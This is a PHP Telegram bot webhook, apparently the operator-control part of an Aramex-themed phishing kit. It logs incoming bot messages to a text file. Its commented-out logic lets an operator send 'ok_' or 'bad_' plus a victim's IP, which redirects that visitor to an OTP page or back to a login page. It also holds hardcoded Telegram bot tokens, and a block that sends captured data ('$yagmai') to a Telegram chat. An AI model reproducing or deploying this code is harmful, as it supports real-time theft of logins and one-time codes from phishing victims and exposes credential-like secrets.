<?php 

//session_start();

/*error_reporting(E_ALL);
ini_set('display_errors',1);
date_default_timezone_set('UTC');

*/

$TOKEN ="5076921485:AAHg4JZacWei_JcEw8D8p5nWwA21rKODDjA"; # YOUR BOT TOKEN .
$chatidd="-1001705141935"; 
$userbots="@ARAMEXXXX";
define("TOKEN",$TOKEN); # DEFINE THE TOKEN AS TOKEN TO USE IT INSIDE FUNCTION

function bot($method,$datas=[]){
if(function_exists('curl_init')){
$url = "https://api.telegram.org/bot".TOKEN."/".$method;
$ch  = curl_init();
curl_setopt($ch,CURLOPT_URL,$url); 
curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch,CURLOPT_POSTFIELDS,$datas);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);

$res = curl_exec($ch);
if(curl_error($ch)){
var_dump(curl_error($ch));
}else{
    return json_decode($res);
} # END OF ISSET CURL
}else{
    $iBadlz = http_build_query($datas);
    $url    = "https://api.telegram.org/bot".TOKEN."/".$method."?$iBadlz";
    $iBadlz = file_get_contents($url);
    return json_decode($iBadlz);
} # END OF !CURL EXISTS
}
# Usage :

@$update = json_decode(file_get_contents('php://input'));
@$message = $update->message;
@$message = $update->message;
@$username = $message->from->username;
@$message_id2 = $update->callback_query->message->message_id;
@$text = $message->text;
@$chat_id2= $update->callback_query->message->chat->id;
@$data = $update->callback_query->data;
@$chat_id2 = $update->callback_query->message->chat->id;
@$Name = $update->callback_query->from->first_name;
@$message_id = $update->callback_query->message->message_id;
@$data = $update->callback_query->data;
@$message = $update->message;
@$from_id = $message->from->id;
@$chat_id = $message->chat->id;
@$text = $message->text;
@$useree = $update->callback_query->message->chat->id;
@$username = $message->from->username;
@$fn = $message->from->first_name;
@$user_id = $message->from->id;
@$from_id = $message->from->id;
@$user_id = $message->from->id;
@$userbot = $userbots; #معرف البوت 



if($text){
         $eg = fopen('res.txt', 'a+');
	$suck = $text;
	fwrite($eg, $suck."\n"); 

}


if($text == "del"){

     $filename = 'res.txt';

if (file_exists($filename)) {
     
// unlink('res.txt');
 //if (filectime($filename)< (time()-30)) {  // timer -30secs
          unlink($filename);
      //  }
}

}



 //$_SESSION['textssss'] = '';


/*
$ip = getenv("REMOTE_ADDR");

if($text == 'ok_'.$ip or $text == 'OK_'.$ip){
      //echo 'ok';

 /* header( "refresh:5;url=otpss.php" );*/
   //  header("location:otpss.php");
     
/*     $_SESSION['textssss'] = 'ok';
     $_SESSION['testing'] = time(); // Update session
   
      bot('sendMessage',[
'chat_id'=>$chatId,
'text'=> $_SESSION['testing']. $_SESSION['textssss'],
]);
     
     
     */
     
     /*$filename = 'res.txt';

if (file_exists($filename)) {
     
 unlink('res.txt');
              $eg = fopen('res.txt', 'a');
	$suck = "ok";
	fwrite($eg, $suck.""); 
}{
    
         $eg = fopen('res.txt', 'a+');
	$suck = 'ok_'.$ip;
	fwrite($eg, $suck."\n"); 
//}
     
     
     
     
     
}elseif($text == 'BAD_'.$ip OR $text == 'bad_'.$ip){
 //echo 'bad';
 /*$_SESSION['textssss'] = 'bad';
 $_SESSION['testing'] = time(); // Update session
       bot('sendMessage',[
'chat_id'=>$chatId,
'text'=> $_SESSION['testing']. $_SESSION['textssss'],
]);
     */
     
     
   /*  
       $filename = 'res.txt';

if (file_exists($filename)) {
     
 unlink('res.txt');
           $eg = fopen('res.txt', 'a+');
	$suck = "bad";
	fwrite($eg, $suck.""); 
}{
   *
      $eg = fopen('res.txt', 'a+');
	$suck = "bad_".$ip;
	fwrite($eg, $suck."\n"); 
//}
     
     
     
     
     

     
}
/*
echo "00" ;
print("{$_SESSION['textssss']}"."<br />");
/*

// 2 hours in seconds
$inactive = 1200; 
ini_set('session.gc_maxlifetime', $inactive); // set the session max lifetime to 2 hours



if (isset($_SESSION['text']) && (time() - $_SESSION['testing'] > $inactive)) {
    // last request was more than 2 hours ago
    session_unset();     // unset $_SESSION variable for this page
    session_destroy();   // destroy session data
}*/

//echo $text;








/* $_SESSION['text'] = 'bad';
 $_SESSION['testing'] = time(); // Update session
 header("location:login.php");*/
    //  header( "refresh:5;url=login.php" );




/*


if($text == 'ok' or $text == 'OK' ){
      echo 'ok';
/*bot('sendMessage',[
'chat_id'=>$chat_id,
'text'=>"
Send me your token so I can identify you.
You do not know where to find your token, it is located in the settings page of your account
",
]);*/

 // header( "refresh:5;url=otpss.php" );
   /*  header("location:otpss.php");
     
   /*  $_SESSION['text'] = 'ok';
     $_SESSION['testing'] = time(); // Update session
     
      bot('sendMessage',[
'chat_id'=>$chatId,
'text'=>"hhhh",
]);
     
     
     
     
}elseif($text == 'BAD' OR $text == 'bad'  ){
 echo 'bad';
/* $_SESSION['text'] = 'bad';
 $_SESSION['testing'] = time(); // Update session
 header("location:login.php");
    //  header( "refresh:5;url=login.php" );
}




*/




/*else{
	  header( "refresh:20;url=login.php" );
	
}*/

/*


// 2 hours in seconds
$inactive = 1200; 
ini_set('session.gc_maxlifetime', $inactive); // set the session max lifetime to 2 hours



if (isset($_SESSION['text']) && (time() - $_SESSION['testing'] > $inactive)) {
    // last request was more than 2 hours ago
    session_unset();     // unset $_SESSION variable for this page
    session_destroy();   // destroy session data
}
echo $_SESSION['text'] ;
echo $text;



*/





/*


//$chat_id="***";
    bot('sendMessage',[
'chat_id'=>$chatId,
'text'=>$yagmai,
]);


/*








/**
$botToken="1319693218:AAH2YKrCvg18FdN6NIq6_t6wRd545DPbrDc";
$chatId="1214485419";  
//$yagmai="";
  $website="https://api.telegram.org/bot".$botToken;
  $params=[
      'chat_id'=>$chatId,
      'text'=>$yagmai,
  ];
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_HEADER, false);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($params));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);*/